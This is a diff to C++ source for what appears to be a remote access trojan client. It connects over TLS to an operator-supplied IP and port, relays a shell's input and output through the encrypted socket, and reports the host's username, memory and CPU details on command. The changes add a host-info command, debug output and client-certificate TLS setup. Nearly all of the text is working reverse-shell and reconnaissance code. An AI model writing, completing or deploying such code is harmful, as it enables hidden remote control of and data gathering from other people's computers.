@@ -51,7 +51,7 @@ bool Client::SendInfo(){
         delete[] cUsername;
         cUsername = nullptr;
         delete[] cMem;
-	cMem = nullptr;
+	    cMem = nullptr;
         delete[] cCpu;
         cCpu = nullptr;
         delete[] cCores;
@@ -62,12 +62,12 @@ bool Client::SendInfo(){
 void Client::threadReadShell(int& Pipe){
 	fcntl(Pipe, F_SETFL, O_NONBLOCK); //make fd non-block so stop when program exits
 	char cCmdOutput[256];
-	std::string strCmdOutput = "";
-	std::string strPassword = "password";
-	std::string strCmd = "";
 	int iRet = 0, iLen = 0;
 	while(isRunningShell){
 		while((iRet = read(Pipe, &cCmdOutput, 255)) == -1){ //sleep until reads data or loop break
+			if(!isRunningShell){
+				break;
+			}
 			usleep(100000);
 			continue;
 		}
@@ -75,7 +75,7 @@ void Client::threadReadShell(int& Pipe){
 		iLen = strlen(cCmdOutput);
 		iRet = SSL_write(sslSocket, cCmdOutput, iLen);
 		#ifdef _DEBUG
-		std::cout<<"Sent "<<iRet<<" bytes\n";
+		std::cout<<cCmdOutput<<"\nSent "<<iRet<<" bytes\n";
 		#endif
 		if(iRet <= 0){
 			#ifdef _DEBUG
@@ -151,11 +151,10 @@ void Client::SpawnShell(const std::string strCommand){
 		std::thread t1(&Client::threadReadShell, this, std::ref(OutPipeFD[0]));
 		
 		//here read from socket and write to pipe
-		std::string strCmdBuffer = "";
 		char cCmdBuffer[512];
 		int iBytes = 0, iLen = 0;
 		while(isRunningShell){
-			iBytes = SSL_read(sslSocketm cCmdBuffer, 511);
+			iBytes = SSL_read(sslSocket, cCmdBuffer, 511);
 			if(iBytes <= 0){
 				isRunningShell = false;
 				#ifdef _DEBUG
@@ -165,9 +164,12 @@ void Client::SpawnShell(const std::string strCommand){
 				break;
 			}
 			cCmdBuffer[iBytes] = '\0';
+			#ifdef _DEBUG
+			std::cout<<"command "<<cCmdBuffer<<'\n';
+			#endif
 			iLen = strlen(cCmdBuffer);
 			write(InPipeFD[1], cCmdBuffer, iLen);
-			if(strcmp(strCmdBuffer.c_str(), "exit\n") == 0){
+			if(strcmp(cCmdBuffer, "exit\n") == 0){
 				#ifdef _DEBUG
 				std::cout<<"\nbye\n";
 				#endif
@@ -350,7 +352,6 @@ bool Client::ParseCommand(char*& strCommand){
 		}
 		if(vcCommands[0] == "s"){
 			if(vcCommands[1] == "0"){
-				Misc::Free(strCommand, 0);
 				#ifdef _DEBUG
 				std::cout<<"Bye\n";
 				#endif
@@ -393,6 +394,16 @@ bool Client::ParseCommand(char*& strCommand){
 			}
 			goto release;
 		}
+		if(vcCommands[0] == "i"){
+			if(vcCommands[1] == "0"){
+				if(!SendInfo()){
+					#ifdef _DEBUG
+					std::cout<<"Unable to send information\n";
+					error();
+					#endif
+				}
+			}
+		}
 		
 	} else {
 		#ifdef _DEBUG
@@ -400,7 +411,6 @@ bool Client::ParseCommand(char*& strCommand){
 		#endif
 	}
 	release:
-	Misc::Free(strCommand, 0);
 	return true;
 }
 
@@ -415,8 +425,20 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 	if(sslSocket){
 		SSL_free(sslSocket);
 	}
-	sslCTX = SSL_CTX_new(TLS_client_method());
+	sslCTX = SSL_CTX_new(SSLv23_client_method());
 	if(sslCTX == nullptr){
+		#ifdef _DEBUG
+		ERR_print_errors_fp(stderr);
+		#endif
+		return false;
+	}
+	if(SSL_CTX_use_certificate_file(sslCTX, "../../../cacer.pem", SSL_FILETYPE_PEM) <= 0){
+		#ifdef _DEBUG
+		ERR_print_errors_fp(stderr);
+		#endif
+		return false;
+	}
+	if(SSL_CTX_use_PrivateKey_file(sslCTX, "../../../privkey.pem", SSL_FILETYPE_PEM) <= 0){
 		#ifdef _DEBUG
 		ERR_print_errors_fp(stderr);
 		#endif
